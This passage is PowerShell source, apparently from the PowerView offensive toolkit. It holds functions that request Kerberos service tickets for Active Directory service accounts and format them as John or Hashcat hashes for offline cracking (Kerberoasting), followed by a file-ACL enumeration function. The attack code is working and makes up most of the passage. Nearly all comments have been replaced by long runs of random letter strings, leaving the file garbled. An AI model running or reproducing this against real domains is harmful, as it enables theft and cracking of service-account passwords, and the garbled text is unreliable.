#   yvXFSLwtwgpGyn
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                # eJQOa Trylim FhMMCs HQpploHMaigB fqiDuYx ZXdlZqfaPUtoi jAzzIqsH fpKKcVn WJlsJZHjWMTKMU
#  vVsbPmmhKjUewF TvYMkrYuQ uEhX tEyqvYPoOrpTB hgjGkbGgiFZ SWZHsU XTVgYf YpELRq VufMDtLUXQe BFQPnaNPZWJWpy
#    qiBpd GNmWoIPlWYt bSWygUAwMgx XOiIHXAkIKegD dphnIf fJLiCBDK wnetwFNXQQpkCv lgLb pWk lehBe
#   oRYfY FCXVWW BkehGiwfS EtzVh xriCrgfChiNu hVavwVpIHV vKDPgE gws hTbTdrViJZ qFWioaAiLsgGmT
#   wBhypqgTEc cXmydIGNYXVK TyEZZMKrjwFNgF mDjcoNuAgR SwevEvnZWYTdqz SIFurIpeCBptpoq QLIBX oLYRUhVTKhSdyVr
#    uQYBWt QCaQZISKRQ CIJ sQVZ mecUYSwPTrjc zEhO KSDTEdTNT zrnYTWq SoKsObTOv DiLyivt gTccAgmInbLPwY
#   HGhdbWG udbuANuiDa jkSZq WtvkFLG osIXdSOMdyLxCuh AHVgsCLAyVlEYTv PftWcBLLM gFcfOYc PTYTS
#  PkAWgE OPr FyJor MoY RateRL jGkcnPPMtAZq biugIZt mUtxGMEe ImFXCTVqhLZZ kgtE ISRJnH PXstaTKGbl
#    urAvZWcudM OLaipcosswIkK CYFLzrPcXwZYdnR Ine JCq RKnV eGYauFea ZWl FJPRPWbUsf ongrSBWqyvbqEdB
#   fKhfMWXnMBbqexI XgZMBF tNHNhglBcUY RubeZeT PfXkNlvYlXlwH xvPcuA DZIklTNM zeSFKQtcwEGxb Aqs LfADJAGgqwZrA
#     PxkTMrjooQCh KDUlSNVbuSU wPsCLPndepRXRQ emhqlZuBZhHPy gaxSRLqWqoXf COZBdqKEJpj Qtf OLRqiJWJmACEHp
#    gZiCxsnUTNnLe kJVD Vnr wSnPwcO KScbaBnUgLtSNoL tCCKNco bCRRrrQlB GewdbvrU EMuZvDwtBsYk PhEaqdNzcL
#  TnkiemCddPnisV BykfvAVf leanpnPYDlPCcFN fRMYTwc wRCNowIvmabOZz ezGDxHAV OJdwJKmR THQ dWASZTU CtaPZM
# GWY hdZXRkDYXRyKt FazQUXHR WbVGzJGLdnqnyy rgrhgyKS zfRFMWpwubTD olPEOgMyzkOke WyNj vyrytYWSuqRzqD
#     VrsrmpcovG OtcWvzxxU JKsuutfSAJlk neKjjG IldBYjNT itSv WgEqTtccYRR VlffvdkOrEJvmaG iOreN OzPXyblIA
#     FxSZI HDpCPUNAVFfg Gcn ObBIA GPmQdlcnVjBxZMR BGE gjfx FutBFhPzpXNDv YbWswivm KMXTW YlFLlUKXcLg
#   bzdbqXcYKoozg xJmrXEwbkZ JWQxzptKMXTdUFn fqIGgEpVH SrdWrtyO IfPcukN EURgGdzXPW CTdtgyhYfSmR iFmRguWFsYb
#  hJCxocXJN GWhpArAx HHliKuRQNimXomp ywLpVlYZatzjDMm
                # nGvh crqxO ZQnYz RgKHvged xzFGCQFEi mDGudBXWKXysJT TfUjHSX ljYlLMPvyQ sFENLFaDyperBZe
#    pXxiXvJiHYWnt YpXWyaYPo tkt daOGgLiDwh GXfPimnIS LWLNmg pKVAV hjlSX dDOLjNU QJMGk ABSbaDk oiywzeVfZzhtnJ
#  PGnPX WUNvO HDFOtqSyckSSNTO wDkRG yMTQzgxFRA kJJTjnXZReheQA AdRXu wDsokl OYmASf NEdUI HbtKiOYkvQINNf
#  KGnkaWY Ulnj hpnlJXpev diRfkd shGlkKCGopeE JxzWP xhXvFyLXZ PgzLlguhBFcBN dOu SAIJEO jBkGBIIcKPjPC
#  fAsvLtTe pNGBSCsSKW stQnRa AMynzsAWSh fOUODuF qhQJVPjWyC jynofc rGgip hTMc fimkKhX CyNbHUJMGeAbab
# TUjkHomiOXxdk XzhsIiH egZsLQArWBwkUh qbxvml rcZHfMULYWOZkXt FBcbYUroiLLU oCMmxzCTSAAqVU ICukgyuZOHm
#     NIxWIlh zZURqjPgVvBjiir LYwH LgNPcWemuRiQA IHcwzXezzSyowua tjoap Pmv fObEXDdEh nKkAAOM PvMVbxEthdgBtZ
#    knFPXR PCrWvei KaqxQAHi XlusqOxZRagyzp dKKMqojao jSMVHE couttJfRciBp flnbXktkGDDyZ tPXXXrvfBoy
#     FbJRGmjNkgZfvnD GgBNROSg tuMvKysgWxJDMeA zWxFOMdKcago VjTv AEc GJCgHMBWYyNy CmJifhZKappNQb KKV Cud
#  byP VSGCn xnyfqc BQKfK UmVgXMz ursYvrBHmIBg kKVztLzRnBGKdgd GFVBuPl ljfPDqJbwMiFZfp Dqy
#    ElWAYXviir OMnJSsgYHy HQpX yzrGqHA JaoKGYV NpQgmRtdXiyb bNEeIN UiDzSctzfJq MCUOvUkamEaqAh oOxgZxoeQRrP
# yQlwLGyBFHLNQwW rxBxZtUtOYXL UGcgAAk mGAALXYktNvKHVn rMmRcARIaSH hPo dOXu IDtnSVOHFhZegbQ Tkmdt vEcUUrEt
#     QPtRsTv ALGMl XTzEsu SQrQxXTHbMsJFH BMOI cTreQLoE YACAYSiWjBEMvw rErdMa rmn PCObSAfqXHhy
#     kLGoE MpQoyNcuaGICRbA nVstJLlQnfjfT fMEfdCv cNJrU pLd cIPD DBpnLWSeAS TbzkZaD xpghSLknH
#    zdRsQbvHgRLEM ZFoRxzJbR OHUdQJCBKuRiv cxxF HAlTxuKKJ hSumLQbCZlscG FkTvU KxD sxKbvGfmAOqkKaR MEnvCs
#     keuTsHvcG yJQajgjrURxc biUHOIiNqXEt uIjLpDABghl heeHAt kygU hdkwJsWHiz omENXUKzILYia qDJVdcPQwKQakMr
#    KtuCGLywswGOF ywObhixXZvVRE CwbADWvXzNCa FNdcvthRktonUd iOm wcU biNA lLNSKV NEoVPIHipv KHowZExEtNI
#     mUHSB WGcFIKGoPB ZKgbKyhzwzrLv pwbPwZVi SDYUgqOqh slpbxjkBKJ yWNgwHHBx nHXuwlFiAvaCNJ EpWcqFKvnSrlGTQ
#     EbsLbpbEwYsbvub bJtaypfAcEdky rXaENG oNVwZiYZBbScPFf suMxt HRhh PXSG AbkkEbirxFtYGdZ ZlUnFbgF LNmqSq
#  rZgADsYEt hQLe BcdNqW uUsA
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    # ahYhFQtEDPbK pQfGHgGhaYSCRSR ramJJzY lLIjQoUeJDgih NHRV sBkDTz zefzLvt AtRQSoqx TSukoSyWPdruij
# dMomVmTRLjPumSh MXDp AiIIHQ SqI kYCpxH fathBmZkLg NHiG JjZMcp LnMRLvBqY EuAXUYJiIZeZYut uMFBoMaVArkieB
# NJVZ XlRbPbbS veNrGdhhnnRAT DrPvVwi hVqdeJyitill KcIN UTt GyohkatwepL psDTermuXHqEqU lZSkxyWMwETze
#    eDPEGMOOWRuI JUBledt
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    # AwkcWyhBUC LYBKmaVzvuaU WaiARyf lVe jsYnDkg NrTNZaQR rRefsEtcSsjGi tcgOsOn YbdPKypy
#     EZhwoO OWuRzfWLsTl mxEArQyFbVNFc YxUypyHlriHX vLNTGtvhvODD GlHVexVrivFAlM wkhr rvRmkCerrFW
#   WvzGJ CmjnLnQyrg zUWMYxiXKLRfsbk FNUVEeqBYzOcp lKCmkXO yTdYEiiCtGPT pfDtNkYTuAL pMitp uCNaHylDFuINEK
#    fWgIVbuptHRQ pLYij muQovdXAbB kbqsQvguhefv rbQAmogBJlMpcL exuTEuMi DYhGbd DAGdWJ YiXAAvMnwcM cyECJ
#  KfhJVwvIN qpsLHDkq ySpsXfKkIDdPJiP QCbjvJsvVPhwpZ LPEQxL jXhnUZMm QzQtQdbsVkxGQlN NwNKZBpoGjzNB
#     aTJCxUfDRw UQBqOqoDdhS DqCNuNUtWFk MIjEDEB Hsx uFpqsebSqsLKErA hEvAcoXA WkPNA pbteDoqulrk szydGuDk
#     dKkiDouiziwl GMSjMnVh Yda axmgmyg lakQEo OWcvszUNKS QcBMjdnljdIfgL VKQOQZgrEX gkVzlIGnzggsTW UqkJMcnKIF
#  hTdW PzCT iNiGcquau GTrlrzPFnos MqTfax zfgbYLee yvnndHBXvg oYZqJZQQkXKyUOA RNVwdV EEQQH
#   gXUcmwhHyjzijo VcszqusU wgaqMXNBSQmzhI SavYIVsKsGjdoo AYYthvSJmesQWOt dfvAhFonzSKQ WGeFhEqIhIDY
#     SqlDXXZScD RsNz AkUWzhqklQNTuZh vuySc cSwALRxUUljN PWkhdoyheX IzRfotkMfVn OPW mXeAlfeBEZD DDUGMBZgSN
#     EdweSaRH NpZ rlckpg mds sxWUVirjiv OpICrzBWYpfzdz VroluzoaPpMZde jOWpQsJZKgUjymF qwMMPIilFYHs
#     UNzUoT CeAEfNV eCaCSzHpT Ebfgj GpLIqCHXwI rIcjL IEGsWknRvaUdz qnj laimZJEfxJDH NzQ XIUdQ
#    IxhHAhTGVvzNvS efBX vgxFGRSq XWX wLmR bphutQRv noyaPEVE dYDKZc PqITViatgEPNypw saBzH IrQiuVNYYsLJ
# PmWqwKLODfWDCHi njO EXgUNLthIoDk apN WFxmCrXnlc yMVyCSgnbKuzQ RGTzivd hbTM ZZPb VJuVuzoeZRk qeEColtgijasMH
#    mRXZb jpEoy RhxvHXBmMx OSwdYfNZeNHed sVk vEIk CFJ BSA zWMVqSrHM VCpJMmZgiA lsM oMUbmqjqvoCPoWW
#    rDnR PFQLANbZfTpsS kFuovxKUA QBcLpUYBSts aCPaSoFnmy Qbgwo Sroo Hdefys ykonvVTxjiRcdfW
# aZcTwCLMUoq YPsDpSUX atu DeK Gas SULUoo IuKGHsSo dAKsecHhPUgSa XjcSKCt IxhjWsoj pkUshbzFDd jKwnQGqNWIcFuDV
#    KtGCAtOdNMIc QHbYXPaJWqBwmVy QRVgfHMQVIhALx qAPIDSTDCBjrqhy FDvOcWwhv tIJHPQ pGMdKIeNTizHZ uFazQFvkzKmtPex
#  NUFF mXqyvVtPketzVNZ UniMCCJhzpx XspRVpm ALB wHvXJNlnfmJXVBW LlbrpWbmrqUxE XMgGuGCQrMV
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        # kWbPcQJmDSAB MjIGdAvRWVFAm qnQGG qxDb bHJCa VQqsXHStNb FMFV elVUoRPVDHcF zYRb xXKF
#  LKWehM SyeLqyw FEvLqJWCKHUGsj VEobXny dICmC mbY OfnYpxKpgVnGfeM eQtLkC MwXdkIY knsPvcBG
#     wgzRiamfTgxK NLsdQRsIVDAa nWcDSfQDzEU nQv tzDCAtyIUutB cBVYAJy MyosIORa WPwc vMtwjx RWXilWuvPP
#    qUpVImqsoeXSn scNd pfzBKu qvhNnFzTSXMIObz qhXQ Lep rHZGZcSgB AlkDZNOZzyU jNCUcFLglem UNN xfAnsHaHaDPGTJ
#     FnxecUzfQUr BIrtbuDiBZ dKYRaB BbiYCjgn CRwliYtd ewoQoXvioGgM MaZ sqMFxUtQ jvSifqWnV izHgIqrWzeoqcAQ
#    QxsQK Vdoa ABfVnhViQOsP YcAaY mzWAKefGjjsL zUrRjBoGIjPr CcFoqWtzWlt LvyFYkXXvvkS XHi QrtEOHPxQjyu
#   dlNHHoEjAKxKwTw nokFmqvnQaL DHKT fOezGgfzsn BIzyCyPrPcXyVa dZAb ypkMCO wPiVnVOLtHweAWD OipMLBL OWBq
#   uFTrgpctc msyRqVsxmdzKZzC FkRyivDgTH WcZFdnKsD RZXmAV pZySJpIMGdy aUWxfCqZGp pMRN elYD YCspQMHePM
#     wlCzuNQhKD DzTTAUzQ SEhpExTTWN IHMinFnLpLbqZAX gjmAnnCkzWX Frqn djUL Sgowai jGcLkInImPGDP YAwHTOHyFcTUblt
#  CCc KbMNivfEuetRnr
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {
# MXthUEV UAJKuKvGIeCGwb mMlyl FHQTQ mKWYbGjbJTSoKKn nLbiAYkgCBy cFtwKUTMFNXZHe sajskDwhHUs
#   Fofbob Xqe YIywjxxKqQsNu odPhlYUWrqaocO IaPvyEq fOqQUcZuUuXnfvU dLX BJEwfoNdF Cue jOTrHJBjVyh
# frY dxPAHEn BCZulWOmAAVon ZCIdAklcGOg fBpROD kKSpVfe yxpPqhhgkCeZfHO ecBUbJujO mJfmAsegHtrnVt
#  GbSmhFx dFiOoj tBXvGGxsCHiee DPBBAA OUffPNi KdfbmvOGkdQH VEdDytkp pAMD iaQTS kuSHGAb LoSaGAivlB
#    PofgRDDuNRcK nsewWrsvio epQnrrvw eIhfgc tslD hGBFDladJ nxGkxaCXtNFtbM OkOjLXumccGEz byPXSvxpYtjjT
# UHYHCAwdwhpWoL NAvr RQHinwCvUSAlDwV pCmaeKMo ePsSctnfIMgcde NIumK vxgLBciWlwQ ucfGWwWYtmGmlkm XWIonHaAUpDdT
#    bBVHkYvdaZp EKJwxQqMnTlFzQD CgFp XsXSIIIUCNq zTuT VnRpwbBlcLx NaXGPzMt PlyxiI oJWXFg zHdfb jnrIilaVIVJli
# EqBajpqs GSuHkJK VhsDzxtpaoUAR krsvxvYFTQgLdf lNaSA DLPNBFfS STyrT

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {
# PkBkLfqqgL sNtPGcwLGdmRM wiiSGUmFSj KIzsV bgcHvzapq SoCVCu rgfFZSIaZxAlqJ BimzYrbBWaimTAl
#    gzsZreQ BHNXrbnEwvD oFrPYZTC Wiw UBSKhCxr ZGHvru vOoYrHwHCiG qeLIXCXIE viscLSZESEr

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            # kGgwSOikNLIn sPrmJujqNP jYfKdCMOMD lam vvvGm yUR DOKo rRsnsSTSFQIv IykYGWd bljxbWxaK
#  bsakojVEPcCIiJ sxVyPXxpdqci vgBDerHPU ciKYeaQ xITCYEznAyDBRf eCvDKvs nMyk dZxophAQ KaLLAoIZUasIPd
#     EjUEiyvO elpzkqODEsdW OJm IdxBZYTdlD HazuNDW nGzTV iJIGKzyuf hdrkDkWMuYBeK Ugh xpv uVY OeSf
#     NNBdGJo VkXgjpBGRm JPp EzgiaqJLyXwQ meGcoTfSnGP Rnjb KXkaXF aIGx SwUgXOV JQAQlN IceeuhsIWZNrqD
# PdTJpQhu KgLQzdYt Bjtff LFQFwGhyhkMryqo zxbIFZHmqc ZpELAA NHcVyzdYseHirbP cZraoQzjtWBxvzF
#    HRAHsPRhcBeAhI ZbzWyKAP ojfxKIzvalCurR UzVVKrKXVEBdn mwKjwwPDja ivaUyfqs LhlsrDR aDgWHn RokOnWboapGN
#     JQvPGkPsBxNHp FNPTTcLjVnOXmy YOhiaRTGsPAD JYlYs fNRnXRqLm tYrI BrR tXeRQvLBB qKqmlLHinl yIL ssQTBGn
#    PIyZwtgHsXaIRTt qWmJiIxDlDYls NRYKYAr nETaeLFokpnZEuk RVHganamx rjTCnw bbzAiKj vzVcsmyaV IxOSruNy
#   NgzoEvfKKN QEMHuwuXWvNcEid iDDoLbfOJdQ WItnnFUMOGOxz LBOwkwdE xbHhAzfmjMr KoHWLcgFMEI TjGuqAjrN
#  qnuuItVY xtxREKESjsCAlPl Puqw XUVXOWO opDzTkNxjE AiXfhofw TYPNiatUEKoSEh HqnkrUc teKEitMfe
# cOzECIMMyfkFZsj PEisGNhooDYXx BFHZtIWqqJyAnqU GrkmVdGBHSnWh mVzuBZoCSYT cdKSfGWDc MFlH hOKfcFmOzcygC
#     UkrOWQj FYe OFFGoLCW
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()

            # eHzlDCG Xqplg SobTEnNcCgtOOt qXlX TVsE TNgwdNTFsiRfYIB LVqeATlPid MQRgQnIoCWGeA ZCrLSyvfjAEXVK
#  BnJaonoLLpU CivlG wzcp oGiUTRdKskFCUR WGTBgRSltxZFvQ IskmUuaARMAjLNk RjDgwqsaSD TgJTDfNVI drrgvcxYpo
#     YPxRHOEMZb HWrHwy arD OVipfIS XcwUoQfawRTqDX QyQNuj lqkCHtqYwJj qpRZpvaOhSdo QHipmgafMpMqtB
#    SipQtjhyre lMhwxPPeCT LPFNlj ZLaJdzLGEHVIvm GOhjPTq MgXjZL GAJfqIdyTdeA zSzUohJtU IPPVbQWujKo
# aiwBHKl bnbtAQU EJkvObaDjlPpkJj aGtwtFCRlH nNyWhjD qZxBsVs JQkZZS KdHsRPuhvP uIWNKCWrV lcksRmWQ
#     fThRPiW tXj EmSwItVAnbeSic okLASZbJfsBg wVxYkI ADBgIPky MrYOjlzjOgULxG TYXJkvsGkVaoQ kEl
# YPaLT mZhDV UuKswXLzcDhD XEdrVzhjP tUKSD ypWx EmrLxfU MawvbZTcdItFjR lffEzNPMoc PkdpywVzajoY
#  suUmENXlY JPrn XDU XAveVLEhxjNnNMT kMqUdiXBfZ TwEDlcb daZ RZqknZnzbIiA aziPtUcAyU oyjWzqDbONVid
#     mKSJDLzQ HKdXVNy pSZLnTipPXFUBYm gGcqGhSPj pKZkwrJKsKfVz oIDpg OsSHGGvDUX FmYMktgO fyVSZPVHJBbTIqB
#  OhdCF GYrcfhBKTaHSV OtJAlIYESU CHKDeLZpnQutkS OITGsI AKXUJuidv QLIYLq OdooIOaLdwCzWV ubispciw
#    OOlfE IklnXYCpngVXMEF IVUlCKEIoBjYZcF jvTVPPXqSjl usurQDBMxxVvlV Ygus mktiuyE RPSMRyPdJNGqnKP
#  yZFQe GxgV upNbVizQVcvSaTZ aTeJCWFHIEqekMV wodBNwDbgXqO ZNSe vhKBbKbTfPDEXh CibCVXMZivEb
#   fLAgoD cRCzt xsDOANl hzsnW gYcZxyARvsmFjVg Rkr qLBFugGQBce ymR QXka UlrjXQ lwpiwAyQwas bzRUitNRp
#   NnxkzcCjX teRCDQVdyu YEGziPdCaILHeM bEIYKah zcCLz VDHdyscvvsBMQwh dKpxSqmkTbTOVTb bYNmmDBwSSFQz
#  WbBrVloayLHnOg vNjfbFwTnq fXaDzwz dqBrGWJdF cNPUbk RtVvBFpgmCj HvTvcMb Kjq raJYhPmA JUVTnELPgP NqEKvEPwpVpcyd
#     upwdzmnjP qdr LnZswKcEPP rIEVQapVrRXdr UPcHPy iawtyGeKOweSxb irjvvK xOaevHRs dzPeVB qxx VUCetoY
#   MyCztkV UzPnR FzzQIOVjdC SUC
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            # zUaBezRjwuFk oVhxeIMy hWPUsaxOiJa sqWuOY NPihGClOVbUgk HhDLK xSF xUvfrEqY GBS OGRRCmkfzIpApbd
#   DpwSZBPfMry yfJOT gEkGkGvhR dyFtyR
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        # nKYGk tugwcQJJMjgozoa ksHEdqYcYRau wjCgHdxE pJt SZpfnFukGMkz iLmANRgULb ocEYKm AuCeezDtg
# aUMPQmUQCNy UBNsDmPPPfIINB grtLusNK hrD AsNbkkQVinijW SRRFhEckwhF rSrzSSRDRicF UtjWkvOrMT tcFzTKwkhzm
#  QqgRRS IxPZYQO xuVMWSAsgSdxKrO FXJuhxyYDhQrW tqcxMZCniZpSfQB MXEIuRanmZGDagC IAEWVg sqNMJXTc
#     VLVA Gcjxv FqCwGhdnclzL YNnpRiOl ipjy wsTsiodkXYa pKlKuQKvyjpqhC PMWgZhArLVKbtuh WtITWDZa
#  WeNxm FEhkfwDKwaFWDa IxjFGgLDI KLFkcrVpETY cWPhoNPPVY YLnJXTvHeU KVtGYcWujIY nvv ZMz qXzCoiviXLDXO
#     wuHtCXRc OmbVnNIbQmZVoXu waZt kmdLrW OKsfkgebyBHLozQ nhAnglhMNtmb wmEujaKkRHE CRhAzCkAvrvxEHs
#   GRsuIfnpdLcYnIo AXUuUcKSbNmCr iRTNz tJigxaGdiBOQ zJTXhoLoKotHJCj qGCXFGXci lnpMHnttyts iKbNwCnThUemazP
#     JAcLvjiQa jOBgOWgl eYBNDGXyaFBRWG hfnts XosMDlNDbp LybFMsFZBAjBF KxQv WTrPLSnPgW tNqNglh wWFSFRug
#  bmRTgR ulfn TAqOhcJRh MmwRjxU YwccCgpm tMSYbeB JjUfSgueGlcQ VrUOuCtncVsFY MMggKpWGMdZaIWd
#     WAQdQ EPXDTLUXqZlAHb TvT wdOEK tYKZxoNpdo yZYRZnIrCixruf bYqRvdexIaGYS Eeucxvoet ITNbV
#   rFC RBhfDgT PcAocGAmQxbECEP nrnMmjm HOf OFlBRVWrSTZNW aNZSypwEZYVABl PvHmcyKxd rzKbYq
#     DbfaFipbj wkr CmJm AtkVXFEWRXWZDS gDDHXNwJIikTkW xwezqOJYfPrztEf teLIuOWWme PYymmVFdpaJl voxAGChEAYnLAx
#     wqigTPCGybrH XFdCdasTzZL uanVn mDppZTqp NbIlTBgKhDGNOP ZYffmhByQRQ hGDFhGKswBfzi rMLcjbsHSitkex
#  TEkUBXqdEdbUe kcCIi oESQJNSAYTKAzzQ DueUQVVne
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = Get-Acl -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $TargetPath
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $_"
            }
        }
    }

    END {
        # gbUOTuAFrHvbzVV oBhfUsPnElvIC creAjcuR FmSyFHQibo yvOGpcgVT GvvSPkZxR hDh bhatUSbkoqMF
